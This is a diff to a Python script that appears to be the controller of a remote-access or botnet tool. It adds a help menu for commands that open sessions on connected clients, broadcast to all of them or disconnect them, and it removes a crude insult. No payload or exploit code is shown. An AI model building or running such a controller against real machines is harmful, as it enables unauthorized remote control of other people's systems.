@@ -11,6 +11,19 @@ P = '\033[35m' #purple
 C = '\033[36m' #cyan
 GR = '\033[37m' #grey
 
+help=G+ """
+
+  Commands;
+    
+    CONSOLE         =   Start session on specific client
+    BROADCAST       =   Start broadcastin to all clients (no response !!!)
+    DISCONNECT      =   Disconnect a specific client
+    DISCONNECT_ALL  =   Disconnect all clients
+    QUIT            =   Quit the actual session
+    HELP            =   Display commands
+
+"""+W
+
 try:
     host=sys.argv[1]
 except:
@@ -47,6 +60,8 @@ def console(client):
     a = input(P+"HACKER"+B+"_"+O+"@"+B+"_"+P+str(address_list[clients_list.index(client)])+B+"_"+P+"FROM"+B+"_"+P+str(host)+B+"#"+P+"¬ "+W) 
     if 'QUIT' in a:
         main()
+    if 'HELP' in a:
+        print(help)
     if 'DISCONNECT' in a:
         a = bytearray(a.encode('utf-8')) 
         client.send(a)
@@ -68,6 +83,8 @@ def brdcst():
     a = input(P+"HACKER"+B+"_"+O+"@"+B+"_"+P+"NODE1"+B+"_"+P+"FROM"+B+"_"+P+host+B+"#"+P+"¬"+W) 
     if 'QUIT' in a:
         main()
+    if 'HELP' in a:
+        print(help)
     if 'DISCONNECT' in a:
         a = bytearray(a.encode('utf-8'))
         for client in clients_list:
@@ -94,8 +111,7 @@ def main():
         a = input(P+"HACKER"+B+"_"+O+"@"+B+"_"+P+host+B+"#"+P+"¬"+W) 
         if "QUIT" in a:
             print (R+"\nQUITTING...")
-            quit()
-            exit(-1)
+            break
         if "CONSOLE" in a:
             def ask():
                 try:
@@ -131,8 +147,11 @@ def main():
             main()      
         if len(a) == 0:
             main()
+        
+        if 'HELP' in a:
+            print(help)
         else:
-            print("\nyr mom gay\n")
+            print(help)
             main()
 
 
@@ -141,4 +160,4 @@ print (B+'\nServer is running on '+O+host+B+' using port '+O+str(port)+B+'...\n'
 
 main()
 
-#version 1.0
+#version 1.1
